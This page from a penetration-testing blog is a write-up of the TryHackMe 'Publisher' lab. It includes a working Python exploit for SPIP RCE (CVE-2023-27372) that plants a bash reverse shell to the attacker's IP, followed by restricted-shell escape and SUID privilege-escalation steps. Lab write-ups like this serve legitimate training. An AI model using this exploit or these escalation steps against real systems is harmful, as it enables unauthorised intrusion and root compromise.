<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="/assets/css/style.css" />
        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
        <title>Publisher - pwnerguy's shell stuff</title>
        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
        <!-- SEO -->
        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
        <meta name="author" content="pwnerguy" />
        <meta name="robots" content="index, follow" />
    </head>
    <body>
        <header>
            <a href="/" class="logo">pwnerguy's shell stuff</a>
            <nav>
                <a href="/writeups">Writeups</a>
                <a href="/cheatsheets">Cheat Sheets</a>
            </nav>
        </header>
        <main>
            
        <a href="/writeups" class="back-link">← Go back</a>
        <section class="writeup-content">
            <h1>Publisher</h1>
<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-rce">RCE</span> <span class="tag tag-spip-4.2.0-rce">spip-4.2.0 RCE</span> <span class="tag tag-csrf-token-discovery">CSRF Token Discovery</span> <span class="tag tag-docker-escape">Docker Escape</span> <span class="tag tag-rshell-escape">RShell Escape</span> <span class="tag tag-suid">SUID</span></div>
<hr>
<h2>Introduction</h2>
<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/publisher"><strong>Publisher</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this ocasion I&#39;ll firstly enumerate and then exploit a RCE in a vulnerable SPIP version to get a reverse shell, scape a Docker container, scape an rshell and finally abuse of an SUID binary.</p>
<hr>
<h2>Information Gathering</h2>
<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
<ul>
<li>TTL 64: Linux.</li>
<li>TTL 128: Windows.</li>
</ul>
<pre><code>❯ ping -c 1 10.10.133.33
PING 10.10.133.33 (10.10.133.33) 56(84) bytes of data.
64 bytes from 10.10.133.33: icmp_seq=1 ttl=63 time=54.4 ms

--- 10.10.133.33 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.388/54.388/54.388/0.000 m
</code></pre>
<p>In this case, it seems to be a Linux machine. Let&#39;s perform a port scan with nmap.</p>
<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.133.33 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:45 CET
Initiating SYN Stealth Scan at 16:45
Scanning 10.10.133.33 [65535 ports]
Discovered open port 22/tcp on 10.10.133.33
Discovered open port 80/tcp on 10.10.133.33
Completed SYN Stealth Scan at 16:45, 16.32s elapsed (65535 total ports)
Nmap scan report for 10.10.133.33
Host is up, received user-set (0.056s latency).
Scanned at 2025-10-31 16:45:03 CET for 17s
Not shown: 64016 closed tcp ports (reset), 1517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
           Raw packets sent: 81300 (3.577MB) | Rcvd: 69984 (2.799MB)
</code></pre>
<pre><code>❯ nmap -sCV -p22,80 10.10.133.33 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:46 CET
Nmap scan report for 10.10.133.33
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:71:0c:db:f5:2e:2a:0d:30:45:69:cb:31:a2:c7:37 (RSA)
|   256 9a:31:e1:ea:56:42:8d:93:c5:7c:96:0b:63:95:f0:23 (ECDSA)
|_  256 bd:b5:45:c5:5e:16:0a:ae:b7:18:08:fc:5e:54:9e:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher&#39;s Pulse: SPIP Insights &amp; Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
</code></pre>
<p>nmap found some open ports. The intrussion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible operating system versions. We are facing an <strong>Ubuntu Focal</strong>.</p>
<p>We can&#39;t do much with the SSH service since we don&#39;t have credentials yet. Now it&#39;s time to enumerate the web server running on the port 80:</p>
<pre><code>❯ whatweb http://10.10.133.33
http://10.10.133.33 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.133.33], Title[Publisher&#39;s Pulse: SPIP Insights &amp; Tips]
</code></pre>
<p><img src="/assets/images/publisher/web.png" alt=""></p>
<p>We have nothing interesting on either the website or the source code. Both <a href="https://www.wappalyzer.com/"><strong>Wappalyzer</strong></a> and nmap confirm the Apache version which is <strong>2.4.41</strong>.</p>
<pre><code>❯ gobuster dir -u 10.10.133.33 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.133.33
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--&gt; http://10.10.133.33/images/]
/spip                 (Status: 301) [Size: 307] [--&gt; http://10.10.133.33/spip/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>
<p><strong>Gobuster</strong> found the <code>img/</code>  and <code>spip/</code>. Inside <code>spip/</code> you can find some links to differents parts of the website. </p>
<p><strong>SPIP is a CMS</strong> as we can see in <strong>Wappalyzer</strong>, and it&#39;s using <strong>PHP</strong>. Actually, SPIP is a free, open-source content management system (CMS) for creating and managing websites, with a particular focus on collaborative editing and multilingual support. It is written in <strong>PHP</strong>, runs on a database, and is designed to be easy to use for authors, separating editorial, technical, and design tasks</p>
<p><img src="/assets/images/publisher/web2.png" alt=""></p>
<hr>
<h2>Vulnerability Assessment</h2>
<p>Let&#39;s search an exploit with <strong>searchsploit</strong> for the 4.2.0 version of SPIP.</p>
<pre><code>❯ searchsploit SPIP 4.2.0
------------------------------------------------------------------------------------------------
 Exploit Title                                                            |  Path
------------------------------------------------------------------------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                     | php/webapps/51536.py
------------------------------------------------------------------------------------------------
Shellcodes: No Results
</code></pre>
<p>The intrusion might be from the login panel, the search bar, or any other location of the <code>spip/</code> directory, but I&#39;ll try to execute this exploit and see if I can get a RCE.</p>
<p>The operation is simple, but in order to execute code in the server, I needed to <strong>edit the Python script</strong>. The original payload failed due to improperly nested quotes and lack of quote escaping which <strong>broke the PHP syntax</strong>.</p>
<p>The edited payload use double quotes to wrap the PHP string and single quotes inside the Bash command, ensuring proper nesting and escaping. This allowed the reverse shell to execute successfully.</p>
<pre><code class="language-python">#!/usr/bin/env python3

import argparse
import bs4
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description=&quot;PoC CVE-2023-27372 - SPIP &lt; 4.2.1 RCE (Unauthenticated)&quot;)
    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, required=True, help=&quot;SPIP base URL (e.g., http://target/spip)&quot;)
    parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, required=True, help=&quot;Command to execute (reverse shell or blind RCE)&quot;)
    parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;, help=&quot;Verbose mode&quot;)
    return parser.parse_args()

def get_anticsrf(url):
    try:
        r = requests.get(f&quot;{url}/spip.php?page=spip_pass&quot;, timeout=10)
        soup = bs4.BeautifulSoup(r.text, &#39;html.parser&#39;)
        csrf_input = soup.find(&#39;input&#39;, {&#39;name&#39;: &#39;formulaire_action_args&#39;})
        if csrf_input:
            csrf_value = csrf_input[&#39;value&#39;]
            if options.verbose:
                print(f&quot;[+] Anti-CSRF token found: {csrf_value}&quot;)
            return csrf_value
        else:
            print(&quot;[-] Unable to find Anti-CSRF token&quot;)
            return None
    except Exception as e:
        print(f&quot;[-] Error retrieving CSRF token: {e}&quot;)
        return None

def send_payload(url, csrf, payload):
    data = {
        &quot;page&quot;: &quot;spip_pass&quot;,
        &quot;formulaire_action&quot;: &quot;oubli&quot;,
        &quot;formulaire_action_args&quot;: csrf,
        &quot;oubli&quot;: payload
    }
    headers = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,
        &quot;Referer&quot;: f&quot;{url}/spip.php?page=spip_pass&quot;
    }
    try:
        r = requests.post(f&quot;{url}/spip.php?page=spip_pass&quot;, data=data, headers=headers)
        if options.verbose:
            print(f&quot;[+] Sent payload: {payload}&quot;)
            print(f&quot;[+] HTTP status: {r.status_code}&quot;)
        return r.status_code
    except Exception as e:
        print(f&quot;[-] Error sending payload: {e}&quot;)
        return None

if __name__ == &#39;__main__&#39;:
    options = parseArgs()
    requests.packages.urllib3.disable_warnings()

    csrf = get_anticsrf(options.url)
    if not csrf:
        exit(1)

    php_payload = f&#39;&lt;?php system(&quot;bash -c \&#39;exec bash -i &amp;&gt;/dev/tcp/10.8.78.182/4646 &lt;&amp;1\&#39;&quot;); ?&gt;&#39;
    serialized = f&#39;s:{len(php_payload)}:&quot;{php_payload}&quot;;&#39;

    if options.verbose:
        print(f&quot;[+] Final serialized payload: {serialized}&quot;)

    send_payload(options.url, csrf, serialized)
</code></pre>
<hr>
<h2>Exploitation</h2>
<p>Now, let&#39;s try to get a reverse shell and get access to the machine.</p>
<p><img src="/assets/images/publisher/reverse_shell.png" alt=""></p>
<hr>
<h2>Post-Exploitation</h2>
<p>TTY upgrading:</p>
<pre><code>❯ script /dev/null -c bash
❯ Ctrl+Z
❯ stty raw -echo; fg
❯ reset xterm
❯ export TERM=xterm
❯ export SHELL=bash
❯ stty rows 44 columns 185
</code></pre>
<p>Now, if you look at the IP of the machine, you&#39;ll see that we are in a <strong>Docker container</strong> inside the Publisher machine. We need to get out of it.</p>
<p>We found the <strong>user flag</strong>!</p>
<p><img src="/assets/images/publisher/flag.png" alt=""></p>
<p>In the <code>.ssh/</code> directory of the user <strong>think</strong> you&#39;ll find a file <code>id_rsa</code> that is think&#39;s private key. </p>
<p>If you try to connect to <code>think@10.10.133.33</code> via SSH using that private key with the command <code>ssh -i id_rsa think@10.10.133.33</code> , you&#39;ll gain access to the real machine. I noticed that when I tried it, since I saw the string <code>think@publisher</code> in the <code>authorized_keys</code> file. That made me think that this user may be <strong>is in the real machine too</strong>.</p>
<p>In think&#39;s home directory you&#39;ll find the same flag we found before.</p>
<p><strong>Linpeas</strong> show us an interesting SUID file.</p>
<pre><code>think@ip-10-10-133-33:/etc/apparmor.d$ ls -l /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
</code></pre>
<p>Using the command <code>strings</code> we can see that it executes a bash scrip: <code>/opt/run_container.sh</code>.</p>
<pre><code>think@ip-10-10-133-33:/etc/apparmor.d$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
</code></pre>
<p>We need to modify the file and add <code>bash -p</code> to get a shell as root, but notice that we are in an Ash Shell and we can&#39;t write anything.</p>
<blockquote>
<p><a href="https://www.geeksforgeeks.org/linux-unix/difference-between-ash-and-bash/">ash (Kenneth Almquist&#39;s ash shell)</a> <strong>is a lightweight (92K) Bourne compatible shell</strong>. Great for machines with low memory, but does not provide all the extras of shells like bash, tcsh, and zsh.</p>
</blockquote>
<p>I need to get a bash shell in order to bypass those restrictions. I have used a kernel library to spawn a bash shell:</p>
<pre><code>/usr/lib64/ld-linux-x86-64.so.2 /bin/bash
</code></pre>
<p>The <strong>dynamic loader</strong> <code>/usr/lib64/ld-linux-x86-64.so.2 /bin/bash</code> (the name may vary depending on the distro) loads the required shared libraries and start the <strong>/bin/bash</strong> shell. This method is also a way to directly execute a binary by explicitly specifying the dynamic loader to use for that particular binary.</p>
<p>Then, I added <code>bash -p</code> to the <code>/opt/run_container.sh</code> script and ran the <strong>SUID</strong> binary <code>/usr/sbin/run_container</code>.</p>
<p><img src="/assets/images/publisher/root_flag.png" alt=""></p>

        </section>
    
        </main>
        <footer>
            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
            <div class="icons">
                <a href="mailto:rmp.it@proton.me" target="_blank"">
                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
                </a>
                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
                </a>
                <a href="https://github.com/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
                </a>
                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
                </a>
                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
                </a>
            </div>
        </footer>
        <script>
            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const q = searchInput.value.toLowerCase();
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`;
            //             if (haystack.includes(q)) {
            //                 card.classList.remove("hidden");
            //             } else {
            //                 card.classList.add("hidden");
            //             }
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
            document.querySelectorAll('a[href^="http"]').forEach(a => {
                a.setAttribute("target", "_blank");
                a.setAttribute("rel", "noopener noreferrer");
            });
            });

            // document.addEventListener("DOMContentLoaded", () => {
            //     const cards = document.querySelectorAll('.writeup-card');
            //     const searchInput = document.getElementById('searchInput');
            //     if (!searchInput) return;
            //     searchInput.addEventListener('input', () => {
            //         const terms = searchInput.value
            //             .toLowerCase()
            //             .trim()
            //             .split(/\s+/);
            //         cards.forEach(card => {
            //             const categories = (card.dataset.categories || "").toLowerCase();
            //             const title = card.querySelector("h2").textContent.toLowerCase();
            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
            //             const matches = terms.every(t => haystack.includes(t));
            //             card.classList.toggle("hidden", !matches);
            //         });
            //     });
            // });

            document.addEventListener("DOMContentLoaded", () => {
                const cards = document.querySelectorAll('.writeup-card');
                const searchInput = document.getElementById('searchInput');
                const resultsCount = document.getElementById('resultsCount');

                function updateCount() {
                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
                    if (resultsCount) {
                        resultsCount.textContent = `${visible} available machines`;
                    }
                }

                if (!searchInput) return;

                searchInput.addEventListener('input', () => {
                    const terms = searchInput.value
                        .toLowerCase()
                        .trim()
                        .split(/\s+/);

                    cards.forEach(card => {
                        const categories = (card.dataset.categories || "").toLowerCase();
                        const title = card.querySelector("h2").textContent.toLowerCase();
                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");

                        const matches = terms.every(t => haystack.includes(t));
                        card.classList.toggle("hidden", !matches);
                    });

                    updateCount();
                });

                updateCount();
            });

        </script>
    </body>
</html>